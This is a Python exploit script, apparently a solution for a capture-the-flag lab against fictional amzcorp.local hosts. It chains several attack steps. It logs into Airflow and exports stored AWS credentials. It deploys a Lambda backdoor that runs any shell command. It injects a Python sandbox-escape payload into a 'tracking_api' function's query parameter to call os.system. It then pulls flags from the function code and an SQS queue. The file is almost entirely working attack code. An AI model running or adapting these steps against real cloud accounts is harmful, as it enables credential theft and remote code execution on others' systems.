#!/usr/bin/env python3
"""Flag 5: Airflow creds -> Lambda RCE -> tracking_api / SQS flags."""
import json
import os
import re
import subprocess
import sys
import zipfile
from io import BytesIO
from pathlib import Path

import requests

WORKDIR = Path(__file__).resolve().parents[1]
ENDPOINT = "http://cloud.amzcorp.local"
WORKFLOW = "http://workflow.amzcorp.local"


def airflow_export() -> dict[str, str]:
    s = requests.Session()
    r = s.get(f"{WORKFLOW}/login/")
    csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', r.text).group(1)
    s.post(
        f"{WORKFLOW}/login/",
        data={
            "username": "olivia",
            "password": os.environ.get("OLIVIA_PASSWORD", ""),
            "csrf_token": csrf,
        },
    )
    r = s.get(f"{WORKFLOW}/variable/list/")
    csrf2 = re.search(
        r'id="action_form".*?csrf_token" value="([^"]+)"', r.text, re.S
    ).group(1)
    ids = re.findall(r'name="rowid" value="(\d+)"', r.text)
    r = s.post(
        f"{WORKFLOW}/variable/action_post",
        data=[
            ("csrf_token", csrf2),
            ("action", "varexport"),
            *[("rowid", x) for x in ids],
        ],
    )
    return r.json()


def aws(cmd: list[str], env: dict[str, str]) -> str:
    full = [
        "aws",
        f"--endpoint-url={ENDPOINT}",
        "--cli-binary-format",
        "raw-in-base64-out",
        *cmd,
    ]
    return subprocess.check_output(full, text=True, env=env, stderr=subprocess.STDOUT)


def lambda_invoke(env: dict[str, str], func: str, payload: dict) -> str:
    payload_path = WORKDIR / "artifacts" / "lambda_payload.json"
    out_path = WORKDIR / "artifacts" / "lambda_output.txt"
    payload_path.write_text(json.dumps(payload))
    aws(
        ["lambda", "invoke", "--function-name", func, "--payload", f"fileb://{payload_path}", str(out_path)],
        env,
    )
    return out_path.read_text()


def create_rce_lambda(env: dict[str, str], name: str = "pwnflag") -> None:
    rce_py = WORKDIR / "artifacts" / "rce.py"
    rce_zip = WORKDIR / "artifacts" / "rce.zip"
    rce_py.write_text(
        "import os\n"
        "def lambda_handler(event, context):\n"
        "    cmd = event.get('cmd', 'id')\n"
        "    return os.popen(cmd).read()\n"
    )
    subprocess.check_call(["zip", "-qj", str(rce_zip), str(rce_py)])
    try:
        aws(
            [
                "lambda",
                "create-function",
                "--function-name",
                name,
                "--runtime",
                "python3.8",
                "--role",
                "arn:aws:iam::000000000000:role/serviceadm",
                "--handler",
                "rce.lambda_handler",
                "--zip-file",
                f"fileb://{rce_zip}",
            ],
            env,
        )
    except subprocess.CalledProcessError as e:
        if "ResourceConflictException" not in e.output:
            raise


def rce(env: dict[str, str], cmd: str, func: str = "pwnflag") -> str:
    raw = lambda_invoke(env, func, {"cmd": cmd})
    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        return raw


def download_tracking_api(env: dict[str, str]) -> bytes:
    loc = json.loads(aws(["lambda", "get-function", "--function-name", "tracking_api"], env))[
        "Code"
    ]["Location"]
    fixed = loc.replace("172.22.192.2:4566", "cloud.amzcorp.local")
    r = requests.get(fixed, timeout=15)
    r.raise_for_status()
    return r.content


def tracking_api_exec(env: dict[str, str], cmd: str) -> str:
    # code.py: exec(tid.format(unquote(unquote(tracking_id))), {"__builtins__": {}}, {})
    py = (
        "import os; os.system({cmd!r})"
    ).format(cmd=cmd)
    exploit = (
        "1';"
        "a = [x for x in (1).__class__.__base__.__subclasses__() "
        "if x.__name__ == 'catch_warnings'][0]()._module.__builtins__"
        "['__import__']('os').system({cmd!r}); b = 'a"
    ).format(cmd=cmd)
    payload = {"queryStringParameters": {"id": exploit}}
    return lambda_invoke(env, "tracking_api", payload)


def sqs_poll_flag(env: dict[str, str]) -> str | None:
    queues = json.loads(aws(["sqs", "list-queues"], env))
    if not queues.get("QueueUrls"):
        return None
    url = queues["QueueUrls"][0].replace("localhost:4566", "cloud.amzcorp.local")
    for _ in range(20):
        msg = json.loads(
            aws(["sqs", "receive-message", "--queue-url", url, "--max-number-of-messages", "1"], env)
        )
        for item in msg.get("Messages", []):
            body = item.get("Body", "")
            m = re.search(r"AWS\{[^}]+\}", body)
            if m:
                return m.group(0)
    return None


def main() -> None:
    creds = airflow_export()
    print("[+] Airflow variables:", list(creds.keys()))
    env = os.environ.copy()
    env.update(
        {
            "AWS_ACCESS_KEY_ID": creds["AWS_ACCESS_KEY_ID"],
            "AWS_SECRET_ACCESS_KEY": creds["AWS_SECRET_ACCESS_KEY"],
            "AWS_DEFAULT_REGION": "us-east-1",
        }
    )
    ident = aws(["sts", "get-caller-identity"], env)
    print("[+] STS:", ident.strip())

    create_rce_lambda(env)
    print("[+] lambda id:", rce(env, "id").strip())

    flags: list[str] = []
    try:
        blob = download_tracking_api(env)
        zpath = WORKDIR / "artifacts" / "tracking_api.zip"
        zpath.write_bytes(blob)
        with zipfile.ZipFile(BytesIO(blob)) as zf:
            if "flag.txt" in zf.namelist():
                flag = zf.read("flag.txt").decode().strip()
                flags.append(flag)
                print("[+] tracking_api zip flag:", flag)
    except Exception as e:
        print("[!] tracking_api download failed:", e)

    try:
        sqs_flag = sqs_poll_flag(env)
        if sqs_flag:
            flags.append(sqs_flag)
            print("[+] SQS flag:", sqs_flag)
    except Exception as e:
        print("[!] SQS poll failed:", e)

    if flags:
        out = WORKDIR / "artifacts" / "flags_captured.txt"
        existing = out.read_text() if out.exists() else ""
        for f in flags:
            if f not in existing:
                with out.open("a") as fh:
                    fh.write(f + "\n")
        print("[+] new flags:", flags)
    else:
        print("[!] no new flags captured")
        sys.exit(1)


if __name__ == "__main__":
    main()
